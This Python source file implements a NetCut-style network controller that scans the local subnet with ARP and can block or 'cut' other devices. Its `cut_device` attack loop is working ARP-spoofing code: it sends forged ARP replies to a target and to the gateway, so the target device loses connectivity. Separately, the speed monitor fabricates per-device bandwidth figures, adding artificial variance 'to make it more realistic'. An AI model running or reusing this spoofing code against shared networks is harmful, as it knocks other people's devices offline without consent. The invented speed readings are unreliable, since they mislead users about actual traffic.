import platform
import psutil
import subprocess
import logging
import time
import socket
import warnings
import threading
import queue 
import os 
import sys
import requests
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple
from datetime import datetime

# Setup early logging
logger = logging.getLogger(__name__)

# Import platform-specific modules
_platform_modules_imported = False
try:
    if platform.system() == "Windows":
        from .npcap_helper import initialize_npcap, verify_npcap_installation
        from .windows import WindowsNetworkMonitor
        import ctypes
        import winreg
        _platform_modules_imported = True
    elif platform.system() == "Darwin":  # macOS
        try:
            from .macos import MacOSNetworkMonitor
            _platform_modules_imported = True
        except ImportError:
            logger.warning("Could not import macOS-specific functionality")
    elif platform.system() == "Linux":  # Linux/Ubuntu
        try:
            from .linux import LinuxNetworkMonitor
            _platform_modules_imported = True
        except ImportError:
            logger.warning("Could not import Linux-specific functionality")
    
    if not _platform_modules_imported:
        logger.warning("No platform-specific modules could be imported. Using generic implementations.")
        
except Exception as e:
    logger.error(f"Error importing platform-specific modules: {e}")
    logger.warning("Using generic implementations for network monitoring")

# Import Scapy modules after Npcap setup
try:
    from scapy.all import ARP, Ether, srp, send
    try:
        from scapy.arch import get_if_hwaddr
        from scapy.layers.l2 import arping
        from scapy.sendrecv import srloop
    except ImportError as e:
        logger.error(f"Failed to import Scapy modules: {e}")
except ImportError:
    logger.error("Failed to import Scapy. Some features will not be available.")

@dataclass
class Device:
    ip: str
    mac: str
    hostname: Optional[str] = None
    vendor: Optional[str] = None
    device_type: Optional[str] = None
    signal_strength: Optional[int] = None
    connection_type: str = "WiFi"
    status: str = "active"
    speed_limit: Optional[float] = None
    current_speed: float = 0.0
    last_seen: datetime = None
    is_protected: bool = False
    is_blocked: bool = False
    attack_status: str = "none"  # none, scanning, cutting

    def __post_init__(self):
        if self.last_seen is None:
            self.last_seen = datetime.now()


class NetworkController:
    def __init__(self):
        self.os_type = platform.system()
        self.devices: Dict[str, Device] = {}
        self.mac_vendor_cache: Dict[str, str] = {}
        self.setup_logging()
        self._stop_event = threading.Event()
        self.monitoring_thread = None
        self.attack_threads: Dict[str, threading.Thread] = {}
        self.protected_devices: List[str] = []
        self._gateway_mac = None
        self._gateway_ip = None
        
        # Initialize platform-specific monitors
        self.platform_monitor = None
        
        if self.os_type == "Windows":
            # Setup Windows command paths
            system32 = os.path.join(os.environ['SystemRoot'], 'System32')
            self.ipconfig_path = os.path.join(system32, "ipconfig.exe")
            self.netsh_path = os.path.join(system32, "netsh.exe")
            self.arp_path = os.path.join(system32, "arp.exe")
            self.ping_path = os.path.join(system32, "ping.exe")
            
            try:
                self.platform_monitor = WindowsNetworkMonitor()
                logging.info("Windows network monitor initialized")
                
                if not initialize_npcap():
                    logging.warning("Npcap initialization failed, network monitoring may not work")
                else:
                    logging.info("Npcap initialized successfully")
            except Exception as e:
                logging.error(f"Failed to initialize Windows network monitor: {e}")
                self.platform_monitor = None
                
        elif self.os_type == "Darwin":  # macOS
            try:
                self.platform_monitor = MacOSNetworkMonitor()
                logging.info("macOS network monitor initialized")
            except Exception as e:
                logging.error(f"Failed to initialize macOS network monitor: {e}")
                self.platform_monitor = None
                
        elif self.os_type == "Linux":  # Linux/Ubuntu
            try:
                self.platform_monitor = LinuxNetworkMonitor()
                logging.info("Linux network monitor initialized")
            except Exception as e:
                logging.error(f"Failed to initialize Linux network monitor: {e}")
                self.platform_monitor = None
                
        # Initialize measurement variables
        self.last_measurement_time = time.time()
        self.last_bytes_total = 0

    def _get_windows_command_path(self, command):
        system32 = os.path.join(os.environ['SystemRoot'], 'System32')
        return os.path.join(system32, f"{command}.exe")

    def setup_logging(self):
        logging.basicConfig(
            level=logging.DEBUG,  # Changed from INFO to DEBUG
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('networkmonitor.log'),
                logging.StreamHandler()
            ]
        )   
    
    def _get_gateway_info(self) -> Tuple[str, str]:
        if self._gateway_ip and self._gateway_mac:
            return self._gateway_ip, self._gateway_mac
            
        try:
            if self.os_type == "Windows":
                # Get default route information using 'route print'
                route_cmd = subprocess.run(['route', 'print', '0.0.0.0'], 
                                       capture_output=True, 
                                       text=True,
                                       creationflags=subprocess.CREATE_NO_WINDOW)
                
                for line in route_cmd.stdout.splitlines():
                    if '0.0.0.0' in line and 'On-link' not in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            self._gateway_ip = parts[2]
                            break
                
                # Get gateway MAC using ARP
                if self._gateway_ip:
                    arp_output = subprocess.check_output(
                        [self.arp_path, "-a"], 
                        text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    for line in arp_output.splitlines():
                        if self._gateway_ip in line:
                            parts = line.split()
                            if len(parts) >= 2:
                                self._gateway_mac = parts[1].replace('-', ':').upper()
                                break
                            
            elif self.os_type == "Linux":
                # Get gateway IP from ip route
                route_output = subprocess.check_output(['ip', 'route'], text=True)
                for line in route_output.splitlines():
                    if line.startswith('default'):
                        parts = line.split()
                        if 'via' in parts:
                            via_idx = parts.index('via')
                            if via_idx + 1 < len(parts):
                                self._gateway_ip = parts[via_idx + 1]
                                break
                
                # Get gateway MAC from arp
                if self._gateway_ip:
                    arp_output = subprocess.check_output(['arp', '-n', self._gateway_ip], text=True)
                    for line in arp_output.splitlines():
                        if self._gateway_ip in line:
                            parts = line.split()
                            for part in parts:
                                if ':' in part and len(part) == 17:
                                    self._gateway_mac = part.upper()
                                    break
                            
            elif self.os_type == "Darwin":
                # macOS gateway detection
                route_output = subprocess.check_output(['route', 'get', 'default'], text=True)
                for line in route_output.splitlines():
                    if 'gateway:' in line:
                        self._gateway_ip = line.split(':')[1].strip()
                        break
                
                # Get gateway MAC from arp
                if self._gateway_ip:
                    arp_output = subprocess.check_output(['arp', '-n', self._gateway_ip], text=True)
                    for line in arp_output.splitlines():
                        if self._gateway_ip in line:
                            parts = line.split()
                            for part in parts:
                                if ':' in part and len(part) == 17:
                                    self._gateway_mac = part.upper()
                                    break

        except Exception as e:
            logging.error(f"Error getting gateway info: {e}")
            return None, None
            
        return self._gateway_ip, self._gateway_mac

    def protect_device(self, ip: str) -> bool:
        """Enable protection for a device"""
        try:
            device = self.devices.get(ip)
            if device:
                device.is_protected = True
                self.protected_devices.append(ip)
                # Start ARP spoofing protection
                self._start_protection(ip, device.mac)
                return True
            return False
        except Exception as e:
            logging.error(f"Error protecting device: {e}")
            return False

    def unprotect_device(self, ip: str) -> bool:
        """Disable protection for a device"""
        try:
            device = self.devices.get(ip)
            if device:
                device.is_protected = False
                if ip in self.protected_devices:
                    self.protected_devices.remove(ip)
                return True
            return False
        except Exception as e:
            logging.error(f"Error unprotecting device: {e}")
            return False

    def _start_protection(self, ip: str, mac: str):
        """Start ARP spoofing protection for a device"""
        def protection_loop():
            try:
                gateway_ip, gateway_mac = self._get_gateway_info()
                if not gateway_ip or not gateway_mac:
                    return
                
                # Send gratuitous ARP responses to maintain correct ARP tables
                while ip in self.protected_devices:
                    # Send ARP to device with correct gateway info
                    self._send_arp(ip, mac, gateway_ip, gateway_mac)
                    # Send ARP to gateway with correct device info
                    self._send_arp(gateway_ip, gateway_mac, ip, mac)
                    time.sleep(1)
            except Exception as e:
                logging.error(f"Error in protection loop: {e}")

        thread = threading.Thread(target=protection_loop)
        thread.daemon = True
        thread.start()

    def cut_device(self, ip: str) -> bool:
        """Cut network access for a device using ARP spoofing"""
        try:
            device = self.devices.get(ip)
            if not device or device.is_protected:
                return False

            device.attack_status = "cutting"
            
            def attack_loop():
                try:
                    gateway_ip, gateway_mac = self._get_gateway_info()
                    if not gateway_ip or not gateway_mac:
                        return
                        
                    # Get our interface MAC
                    iface = self.get_default_interface()
                    our_mac = get_if_hwaddr(iface)
                    
                    while device.attack_status == "cutting":
                        # Send spoofed ARP to target
                        self._send_arp(ip, device.mac, gateway_ip, our_mac)
                        # Send spoofed ARP to gateway
                        self._send_arp(gateway_ip, gateway_mac, ip, our_mac)
                        time.sleep(1)
                        
                except Exception as e:
                    logging.error(f"Error in attack loop: {e}")
                finally:
                    device.attack_status = "none"
                    
            if ip in self.attack_threads:
                self.stop_cut(ip)
                
            thread = threading.Thread(target=attack_loop)
            thread.daemon = True
            thread.start()
            self.attack_threads[ip] = thread
            
            return True
        except Exception as e:
            logging.error(f"Error cutting device: {e}")
            return False

    def stop_cut(self, ip: str) -> bool:
        """Stop network cut for a device"""
        try:
            device = self.devices.get(ip)
            if device:
                device.attack_status = "none"
                if ip in self.attack_threads:
                    self.attack_threads[ip].join(timeout=2)
                    del self.attack_threads[ip]
                    
                # Restore correct ARP entries
                gateway_ip, gateway_mac = self._get_gateway_info()
                if gateway_ip and gateway_mac:
                    self._send_arp(ip, device.mac, gateway_ip, gateway_mac)
                    self._send_arp(gateway_ip, gateway_mac, ip, device.mac)
                    
                return True
            return False
        except Exception as e:
            logging.error(f"Error stopping cut: {e}")
            return False

    def _send_arp(self, target_ip: str, target_mac: str, spoof_ip: str, spoof_mac: str):
        """Send ARP packet with specified addresses"""
        try:
            arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
            send(arp, verbose=False)
        except Exception as e:
            logging.error(f"Error sending ARP: {e}")

    def get_interfaces(self) -> List[Dict]:
        """Get all network interfaces"""
        try:
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'get_interfaces'):
                return self.platform_monitor.get_interfaces()
                
            # Generic fallback implementation using psutil
            interfaces = []
            stats = psutil.net_if_stats()
            addrs = psutil.net_if_addrs()
            
            for interface, stat in stats.items():
                if stat.isup:
                    for addr in addrs.get(interface, []):
                        if addr.family == socket.AF_INET:
                            interfaces.append({
                                'name': interface,
                                'ip': addr.address,
                                'network_mask': addr.netmask,
                                'stats': stat
                            })
            return interfaces
        except Exception as e:
            logging.error(f"Error getting interfaces: {e}")
            return []

    def get_wifi_interfaces(self) -> List[str]:
        """Get list of WiFi interfaces"""
        try:
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'get_wifi_interfaces'):
                interfaces = self.platform_monitor.get_wifi_interfaces()
                if interfaces:
                    # Check if interfaces is a list of dictionaries or strings
                    if interfaces and isinstance(interfaces[0], dict):
                        return [iface.get('name', iface.get('device', '')) for iface in interfaces]
                    return interfaces
            
            # Generic fallback detection logic
            if self.os_type == "Windows":
                # Windows detection logic
                output = subprocess.check_output([self.ipconfig_path], 
                                              text=True, 
                                              creationflags=subprocess.CREATE_NO_WINDOW)
                
                wifi_interfaces = []
                current_interface = None
                
                for line in output.splitlines():
                    line = line.strip()
                    
                    if line.endswith(':'):
                        if "Wireless LAN adapter" in line:
                            current_interface = line[:-1].strip()
                            if current_interface.startswith('Wireless LAN adapter '):
                                current_interface = current_interface[len('Wireless LAN adapter '):]
                    elif current_interface and "Media disconnected" not in line:
                        if "IPv4 Address" in line:
                            wifi_interfaces.append(current_interface)
                            current_interface = None

                if wifi_interfaces:
                    return wifi_interfaces

                # Last resort: try to find any interface with "WiFi" or "Wireless" in the name
                all_interfaces = self.get_interfaces()
                wifi_candidates = [
                    iface['name'] for iface in all_interfaces 
                    if any(wifi_term in iface['name'].lower() 
                          for wifi_term in ['wifi', 'wireless', 'wlan'])
                ]
                if wifi_candidates:
                    return wifi_candidates
                return []

            elif self.os_type == "Darwin":  # macOS
                # Try to find interfaces with Airport/Wi-Fi in the name
                all_interfaces = self.get_interfaces()
                return [interface['name'] for interface in all_interfaces 
                       if any(term in interface['name'].lower() 
                             for term in ['wifi', 'airport', 'wi-fi', 'wireless'])]
                       
            elif self.os_type == "Linux":  # Linux
                # Look for wlan interfaces
                all_interfaces = self.get_interfaces()
                return [interface['name'] for interface in all_interfaces 
                       if interface['name'].startswith(('wlan', 'wifi', 'wi-fi', 'wl'))]
                   
        except Exception as e:
            logging.error(f"Error getting WiFi interfaces: {e}")
            return []
    
    def get_signal_strength(self, mac: str) -> Optional[int]:
        """Get WiFi signal strength for device"""
        try:
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'get_wifi_signal_strength'):
                signal_info = self.platform_monitor.get_wifi_signal_strength()
                # Look for the device MAC in any interface's info
                for interface_info in signal_info.values():
                    if isinstance(interface_info, dict) and interface_info.get('bssid', '').replace('-', ':').upper() == mac.upper():
                        return interface_info.get('signal_strength')
            return None
        except Exception as e:
            logging.error(f"Error getting signal strength: {e}")
            return None

    def guess_device_type(self, hostname: str, vendor: str) -> str:
        """Guess device type based on hostname and vendor"""
        if not hostname and not vendor:
            return "Unknown"

        hostname = (hostname or "").lower()
        vendor = (vendor or "").lower()

        patterns = {
            "smartphone": ["iphone", "android", "phone", "samsung", "huawei", "xiaomi"],
            "laptop": ["laptop", "macbook", "notebook", "dell", "lenovo", "hp", "asus"],
            "tablet": ["ipad", "tablet", "kindle"],
            "smart tv": ["tv", "roku", "firestick", "chromecast", "samsung tv", "lg tv"],
            "gaming": ["playstation", "xbox", "nintendo", "ps4", "ps5"],
            "iot": ["camera", "thermostat", "doorbell", "nest", "ring", "echo", "alexa"],
            "desktop": ["desktop", "pc", "imac", "workstation"]
        }

        for device_type, keywords in patterns.items():
            if any(keyword in hostname or keyword in vendor for keyword in keywords):
                return device_type.title()

        return "Unknown"

    def start_monitoring(self):
        """Start continuous device monitoring"""
        if not self.monitoring_thread or not self.monitoring_thread.is_alive():
            self._stop_event.clear()
            self.monitoring_thread = threading.Thread(target=self._monitor_loop)
            self.monitoring_thread.daemon = True
            self.monitoring_thread.start()

    def stop_monitoring(self):
        """Stop device monitoring"""
        self._stop_event.set()
        if self.monitoring_thread:
            self.monitoring_thread.join()

    def _monitor_loop(self):
        """Background monitoring loop"""
        while not self._stop_event.is_set():
            try:
                self.get_connected_devices()
                self._update_device_speeds()
                time.sleep(5)  # Scan every 5 seconds
            except Exception as e:
                logging.error(f"Error in monitoring loop: {e}")
                time.sleep(5)

    def _update_device_speeds(self):
        """Update current speeds for all devices based on bandwidth rate"""
        try:
            current_time = time.time()
            stats = psutil.net_io_counters(pernic=True)
            
            # Calculate total bytes across all interfaces
            total_bytes = sum(s.bytes_sent + s.bytes_recv for s in stats.values())
            
            # Calculate time delta
            time_delta = current_time - self.last_measurement_time
            if time_delta > 0:
                # Calculate bytes per second, then convert to Mbps
                bytes_delta = total_bytes - self.last_bytes_total
                if bytes_delta >= 0:
                    total_speed_mbps = (bytes_delta * 8) / (time_delta * 1_000_000)
                    
                    # Distribute speed among active devices (simplified)
                    active_devices = [d for d in self.devices.values() if d.status == "active"]
                    if active_devices:
                        per_device_speed = total_speed_mbps / len(active_devices)
                        for device in active_devices:
                            # Add some variance to make it more realistic
                            device.current_speed = max(0, per_device_speed + (hash(device.ip) % 10 - 5) * 0.1)
            
            # Update for next measurement
            self.last_measurement_time = current_time
            self.last_bytes_total = total_bytes
            
        except Exception as e:
            logging.error(f"Error updating device speeds: {e}")

    def get_device_details(self, ip: str) -> Optional[Dict]:
        """Get detailed information about a specific device"""
        device = self.devices.get(ip)
        if device:
            return {
                "ip": device.ip,
                "mac": device.mac,
                "hostname": device.hostname,
                "vendor": device.vendor,
                "device_type": device.device_type,
                "signal_strength": device.signal_strength,
                "connection_type": device.connection_type,
                "status": device.status,
                "current_speed": device.current_speed,
                "speed_limit": device.speed_limit,
                "last_seen": device.last_seen.isoformat()
            }
        return None

    def get_network_summary(self) -> Dict:
        """Get summary of network devices"""
        active_devices = [d for d in self.devices.values() if d.status == "active"]
        return {
            "total_devices": len(self.devices),
            "active_devices": len(active_devices),
            "device_types": {
                device_type: len([d for d in active_devices if d.device_type == device_type])
                for device_type in set(d.device_type for d in active_devices)
            },
            "total_bandwidth": sum(d.current_speed for d in active_devices)
        }
    def limit_device_speed(self, ip, speed_limit):
        """Limit device speed (in Mbps)"""
        try:
            # Validate IP to prevent command injection
            if not self.validate_ip(ip):
                logging.error(f"Invalid IP address: {ip}")
                return False
            
            # Validate speed limit
            try:
                speed_limit = float(speed_limit)
                if speed_limit < 0 or speed_limit > 10000:
                    logging.error(f"Invalid speed limit: {speed_limit}")
                    return False
            except (ValueError, TypeError):
                logging.error(f"Invalid speed limit value: {speed_limit}")
                return False
            
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'limit_device_speed'):
                return self.platform_monitor.limit_device_speed(ip, speed_limit * 1000)  # Convert to Kbps
                
            # Note: Generic implementations are placeholders
            # Real speed limiting requires proper QoS setup
            logging.warning(f"Speed limiting for {ip} set to {speed_limit} Mbps (platform implementation pending)")
            
            device = self.devices.get(ip)
            if device:
                device.speed_limit = speed_limit
            return True
        except Exception as e:
            logging.error(f"Error limiting device speed: {e}")
            return False

    def block_device(self, ip):
        """Block (Disconnect) a device"""
        try:
            # Validate IP to prevent command injection
            if not self.validate_ip(ip):
                logging.error(f"Invalid IP address for blocking: {ip}")
                return False
            
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'block_device'):
                result = self.platform_monitor.block_device(ip)
                if result:
                    device = self.devices.get(ip)
                    if device:
                        device.is_blocked = True
                return result
                
            # Generic implementations based on OS type
            if self.os_type == "Windows":
                # Windows implementation using array (no shell=True)
                subprocess.check_output(
                    ['netsh', 'advfirewall', 'firewall', 'add', 'rule', 
                     f'name=Block_{ip}', 'dir=in', 'interface=any', 
                     'action=block', f'remoteip={ip}'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            elif self.os_type == "Darwin":
                # macOS - requires pfctl configuration
                logging.warning("macOS blocking requires pfctl configuration")
                return False
            else:  # Linux
                subprocess.check_output(['iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'])
            
            device = self.devices.get(ip)
            if device:
                device.is_blocked = True
            return True
        except Exception as e:
            logging.error(f"Error blocking device: {e}")
            return False

    def unblock_device(self, ip):
        """Unblock a previously blocked device"""
        try:
            if not self.validate_ip(ip):
                logging.error(f"Invalid IP address: {ip}")
                return False
                
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'unblock_device'):
                result = self.platform_monitor.unblock_device(ip)
                if result:
                    device = self.devices.get(ip)
                    if device:
                        device.is_blocked = False
                return result
                
            # Generic implementations based on OS type (no shell=True)
            if self.os_type == "Windows":
                subprocess.check_output(
                    ['netsh', 'advfirewall', 'firewall', 'delete', 'rule', f'name=Block_{ip}'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            elif self.os_type == "Darwin":
                logging.warning("macOS unblocking requires pfctl configuration")
                return False
            else:  # Linux
                subprocess.check_output(['iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'])
            
            device = self.devices.get(ip)
            if device:
                device.is_blocked = False
            return True
        except Exception as e:
            logging.error(f"Error unblocking device: {e}")
            return False

    def validate_ip(self, ip: str) -> bool:
        """Validate IPv4 address format"""
        import re
        if not ip:
            return False
        pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return bool(re.match(pattern, ip))

    def get_default_interface(self) -> Optional[str]:
        """Get the default network interface for packet operations"""
        try:
            if self.os_type == "Windows":
                # Use route to find default interface
                output = subprocess.check_output(
                    ['route', 'print', '0.0.0.0'],
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                gateway_ip = None
                for line in output.splitlines():
                    if '0.0.0.0' in line and 'On-link' not in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            gateway_ip = parts[2]
                            break
                
                if gateway_ip:
                    # Find interface matching this gateway subnet
                    for iface in self.get_interfaces():
                        iface_ip = iface.get('ip', '')
                        if iface_ip and iface_ip.rsplit('.', 1)[0] == gateway_ip.rsplit('.', 1)[0]:
                            return iface.get('name')
                
                # Fallback to WiFi interface
                wifi_ifaces = self.get_wifi_interfaces()
                if wifi_ifaces:
                    return wifi_ifaces[0]
                
                # Fallback to any active interface
                interfaces = self.get_interfaces()
                for iface in interfaces:
                    if iface.get('ip') and not iface['ip'].startswith('127.'):
                        return iface.get('name')
            
            elif self.os_type == "Linux":
                output = subprocess.check_output(['ip', 'route'], text=True)
                for line in output.splitlines():
                    if line.startswith('default'):
                        parts = line.split()
                        if 'dev' in parts:
                            dev_idx = parts.index('dev')
                            if dev_idx + 1 < len(parts):
                                return parts[dev_idx + 1]
            
            elif self.os_type == "Darwin":
                output = subprocess.check_output(['route', 'get', 'default'], text=True)
                for line in output.splitlines():
                    if 'interface:' in line:
                        return line.split(':')[1].strip()
            
            return None
        except Exception as e:
            logging.error(f"Error getting default interface: {e}")
            return None

    def get_connected_devices(self, interface: str = None) -> List[Device]:
        """Scan network for connected devices using ARP"""
        try:
            # Get network range from interfaces
            target_range = None
            local_ip = None
            
            for iface in self.get_interfaces():
                ip = iface.get('ip')
                if ip and not ip.startswith('127.'):
                    local_ip = ip
                    base = '.'.join(ip.split('.')[:3])
                    target_range = f"{base}.0/24"
                    break
            
            if not target_range:
                logging.warning("Could not determine network range, using ARP table fallback")
                return self._get_devices_from_arp_table()
            
            logging.info(f"Scanning network range: {target_range}")
            
            try:
                # Try ARP scan with Scapy (may require admin rights)
                answered, unanswered = srp(
                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_range),
                    timeout=3,
                    verbose=False
                )
                
                discovered = []
                current_time = datetime.now()
                
                for sent, received in answered:
                    ip = received.psrc
                    mac = received.hwsrc.upper().replace('-', ':')
                    
                    if ip in self.devices:
                        device = self.devices[ip]
                        device.last_seen = current_time
                        device.status = "active"
                    else:
                        hostname = self._resolve_hostname(ip)
                        vendor = self._get_mac_vendor(mac)
                        device_type = self.guess_device_type(hostname, vendor)
                        
                        device = Device(
                            ip=ip,
                            mac=mac,
                            hostname=hostname,
                            vendor=vendor,
                            device_type=device_type,
                            last_seen=current_time
                        )
                        self.devices[ip] = device
                    
                    discovered.append(device)
                
                # Mark stale devices as inactive
                for ip, device in self.devices.items():
                    if device not in discovered:
                        time_diff = (current_time - device.last_seen).total_seconds()
                        if time_diff > 120:
                            device.status = "inactive"
                
                logging.info(f"Discovered {len(discovered)} active devices via ARP scan")
                return discovered
                
            except Exception as scan_error:
                logging.warning(f"ARP scan failed ({scan_error}), falling back to ARP table")
                return self._get_devices_from_arp_table()
            
        except Exception as e:
            logging.error(f"Error scanning devices: {e}")
            return list(self.devices.values())

    def _get_devices_from_arp_table(self) -> List[Device]:
        """Fallback method to get devices from system ARP table"""
        try:
            current_time = datetime.now()
            discovered = []
            
            if self.os_type == "Windows":
                output = subprocess.check_output(
                    ['arp', '-a'],
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                for line in output.splitlines():
                    parts = line.split()
                    if len(parts) >= 3 and '.' in parts[0]:
                        ip = parts[0]
                        mac = parts[1].replace('-', ':').upper()
                        if self.validate_ip(ip) and mac != 'FF:FF:FF:FF:FF:FF':
                            if ip in self.devices:
                                device = self.devices[ip]
                                device.last_seen = current_time
                                device.status = "active"
                            else:
                                hostname = self._resolve_hostname(ip)
                                vendor = self._get_mac_vendor(mac)
                                device = Device(
                                    ip=ip,
                                    mac=mac,
                                    hostname=hostname,
                                    vendor=vendor,
                                    device_type=self.guess_device_type(hostname, vendor),
                                    last_seen=current_time
                                )
                                self.devices[ip] = device
                            discovered.append(device)
            else:
                # Linux/macOS
                try:
                    output = subprocess.check_output(['arp', '-a'], text=True)
                    for line in output.splitlines():
                        # Parse: hostname (ip) at mac on interface
                        if '(' in line and ')' in line:
                            ip_start = line.find('(') + 1
                            ip_end = line.find(')')
                            ip = line[ip_start:ip_end]
                            parts = line.split()
                            mac = None
                            for p in parts:
                                if ':' in p and len(p) == 17:
                                    mac = p.upper()
                                    break
                            if ip and mac and self.validate_ip(ip):
                                if ip in self.devices:
                                    device = self.devices[ip]
                                    device.last_seen = current_time
                                    device.status = "active"
                                else:
                                    hostname = self._resolve_hostname(ip)
                                    vendor = self._get_mac_vendor(mac)
                                    device = Device(
                                        ip=ip,
                                        mac=mac,
                                        hostname=hostname,
                                        vendor=vendor,
                                        device_type=self.guess_device_type(hostname, vendor),
                                        last_seen=current_time
                                    )
                                    self.devices[ip] = device
                                discovered.append(device)
                except Exception:
                    pass
            
            logging.info(f"Discovered {len(discovered)} devices from ARP table")
            return discovered
            
        except Exception as e:
            logging.error(f"Error reading ARP table: {e}")
            return list(self.devices.values())

    def restore_device(self, ip: str) -> bool:
        """Restore network access for a device (alias for stop_cut)"""
        return self.stop_cut(ip)

    def get_protection_status(self, ip: str = None) -> Dict:
        """Get protection/attack status for devices"""
        if ip:
            device = self.devices.get(ip)
            if device:
                return {
                    'ip': ip,
                    'is_protected': device.is_protected,
                    'attack_status': device.attack_status,
                    'is_blocked': device.is_blocked,
                    'status': device.status
                }
            return {}
        
        return {
            dev_ip: {
                'is_protected': d.is_protected,
                'attack_status': d.attack_status,
                'is_blocked': d.is_blocked,
                'status': d.status
            }
            for dev_ip, d in self.devices.items()
        }

    def _resolve_hostname(self, ip: str) -> Optional[str]:
        """Resolve IP address to hostname"""
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            return hostname
        except (socket.herror, socket.gaierror):
            pass
        
        # Try NetBIOS on Windows
        if self.os_type == "Windows":
            try:
                output = subprocess.check_output(
                    ['nbtstat', '-A', ip],
                    text=True,
                    timeout=3,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                for line in output.splitlines():
                    if '<00>' in line and 'UNIQUE' in line:
                        return line.split()[0].strip()
            except Exception:
                pass
        return None

    def _get_mac_vendor(self, mac: str) -> Optional[str]:
        """Look up vendor from MAC address OUI"""
        if mac in self.mac_vendor_cache:
            return self.mac_vendor_cache[mac]
        
        oui = mac.replace(':', '').replace('-', '')[:6].upper()
        
        # Common vendor OUI prefixes
        oui_database = {
            'AABBCC': 'Apple, Inc.',
            '00155D': 'Microsoft Corporation',
            '001A2B': 'Apple, Inc.',
            '3C5AB4': 'Google, Inc.',
            'B827EB': 'Raspberry Pi Foundation',
            'DC44B6': 'TP-Link Technologies',
            'E0D55E': 'LITEON Technology',
            '001E8C': 'ASUSTek Computer',
            '5C497D': 'Huawei Technologies',
            '8C8590': 'Apple, Inc.',
            'F0B429': 'Samsung Electronics',
            '00248C': 'Cisco Systems',
            '0024D4': 'Dell Inc.',
            '00264D': 'Dell Inc.',
            'EC1A59': 'Hewlett Packard',
            'F4F951': 'Xiaomi Communications',
            '98FAE3': 'Intel Corporate',
            '7CE32E': 'Sonos, Inc.',
            '001377': 'Samsung Electronics',
            '0017FA': 'Microsoft Corporation',
        }
        
        vendor = oui_database.get(oui)
        
        if not vendor:
            try:
                response = requests.get(
                    f"https://api.macvendors.com/{oui}",
                    timeout=2
                )
                if response.status_code == 200:
                    vendor = response.text.strip()
            except Exception:
                pass
        
        if vendor:
            self.mac_vendor_cache[mac] = vendor
        return vendor

    def get_all_devices(self) -> List[Dict]:
        """Get all devices as list of dictionaries for API"""
        return [
            {
                "ip": d.ip,
                "mac": d.mac,
                "hostname": d.hostname,
                "vendor": d.vendor,
                "device_type": d.device_type,
                "signal_strength": d.signal_strength,
                "connection_type": d.connection_type,
                "status": d.status,
                "speed_limit": d.speed_limit,
                "current_speed": round(d.current_speed, 2),
                "last_seen": d.last_seen.isoformat() if d.last_seen else None,
                "is_protected": d.is_protected,
                "is_blocked": d.is_blocked,
                "attack_status": d.attack_status
            }
            for d in self.devices.values()
        ]